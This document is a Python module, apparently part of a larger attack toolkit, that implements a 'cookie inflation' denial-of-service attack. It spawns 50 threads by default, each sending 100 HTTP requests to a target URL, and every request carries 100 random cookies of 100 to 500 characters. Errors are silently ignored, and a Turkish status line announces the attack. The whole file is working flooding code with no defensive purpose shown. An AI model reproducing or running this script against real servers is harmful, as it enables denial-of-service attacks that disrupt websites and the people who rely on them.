# modules/cookie_inflation.py

import threading
import requests
import random
import string

def generate_cookies():
    cookies = {}
    for i in range(100):
        key = f"session{i}"
        val = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(100, 500)))
        cookies[key] = val
    return cookies

def attack(target, count):
    for _ in range(count):
        try:
            cookies = generate_cookies()
            requests.get(target, cookies=cookies, timeout=5)
        except:
            pass

def run(target, threads=50, requests_per_thread=100):
    print("[*] Başlatılıyor: Cookie Inflation Attack")
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack, args=(target, requests_per_thread))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()
